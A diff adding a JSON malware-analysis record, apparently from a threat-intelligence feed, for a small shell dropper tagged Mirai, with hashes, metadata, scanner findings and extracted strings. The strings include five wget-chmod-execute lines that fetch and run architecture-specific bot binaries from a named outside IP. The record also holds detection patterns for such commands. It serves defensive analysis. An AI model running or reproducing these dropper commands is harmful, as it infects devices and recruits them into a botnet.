@@ -1,0 +1,87 @@
+{
+  "byte_count": 391,
+  "entropy": 4.675,
+  "file_magic": "63 64 20 2f 76 61 72 0a",
+  "generated_at": "2026-06-21T15:03:03.407414+00:00",
+  "md5": "41b45aefd3f0a8e04abe7fd3a632ed94",
+  "metadata": {
+    "anonymous": 0,
+    "code_sign": [],
+    "dhash_icon": null,
+    "file_name": "giga.sh",
+    "file_size": 391,
+    "file_type": "sh",
+    "file_type_mime": "text/plain",
+    "first_seen": "2026-06-21 14:45:34",
+    "gimphash": null,
+    "imphash": null,
+    "intelligence": {
+      "clamav": null,
+      "downloads": "21",
+      "mail": null,
+      "uploads": "1"
+    },
+    "last_seen": null,
+    "magika": "txt",
+    "md5_hash": "41b45aefd3f0a8e04abe7fd3a632ed94",
+    "origin_country": "DE",
+    "reporter": "abuse_ch",
+    "sha1_hash": "d0eddc89079aeac09b7894ddfbf41275d7189848",
+    "sha256_hash": "8985fe09d5b08240ba19c5bb2d1db585be19690dd63ab4b5b777484d73875bc9",
+    "sha3_384_hash": "7e248850f5a460bc68bb9685c2d275ce0c12abd437fd94b4392ae8132cfc38adc2c8c74ed6bb6d6dd181197507331a22",
+    "signature": "Mirai",
+    "ssdeep": "12:lRphviR9hviRAYNkhviR60LKDhviR1OhviRWH:rptQtbYWtoKDt8OtjH",
+    "tags": [
+      "Mirai",
+      "sh"
+    ],
+    "telfhash": null,
+    "tlsh": "T103E065A9B82538A24514FE34F4328615E15BFB81222DA318B2CD363A8CDC600753CEC6",
+    "trid": null
+  },
+  "printable_string_count": 7,
+  "selected_strings": [
+    "wget http://217.60.195.160/gigatex/arm; chmod 777 arm; ./arm gentech",
+    "wget http://217.60.195.160/gigatex/arm5; chmod 777 arm5; ./arm5 gentech",
+    "wget http://217.60.195.160/gigatex/arm7; chmod 777 arm7; ./arm7 gentech",
+    "wget http://217.60.195.160/gigatex/mips; chmod 777 mips; ./mips gentech",
+    "wget http://217.60.195.160/gigatex/mipsel; chmod 777 mipsel; ./mipsel gentech"
+  ],
+  "sha1": "d0eddc89079aeac09b7894ddfbf41275d7189848",
+  "sha256": "8985fe09d5b08240ba19c5bb2d1db585be19690dd63ab4b5b777484d73875bc9",
+  "source_name": "8985fe09d5b08240ba19c5bb2d1db585be19690dd63ab4b5b777484d73875bc9.sh",
+  "static_code": {
+    "byte_count": 391,
+    "decoded_layers": [],
+    "deobfuscated": [],
+    "domains": [],
+    "entropy": 4.675,
+    "findings": [
+      {
+        "category": "shell_dropper",
+        "detail": "Matched 5 occurrence(s)",
+        "severity": "high",
+        "value": "\\bwget\\b"
+      },
+      {
+        "category": "shell_dropper",
+        "detail": "Matched 5 occurrence(s)",
+        "severity": "high",
+        "value": "\\bchmod\\s+(?:\\+x|777|755)"
+      }
+    ],
+    "functions": [],
+    "ips": [
+      "217.60.195.160"
+    ],
+    "language_hint": "shell",
+    "line_count": 8,
+    "urls": [
+      "http://217.60.195.160/gigatex/arm",
+      "http://217.60.195.160/gigatex/arm5",
+      "http://217.60.195.160/gigatex/arm7",
+      "http://217.60.195.160/gigatex/mips",
+      "http://217.60.195.160/gigatex/mipsel"
+    ]
+  }
+}
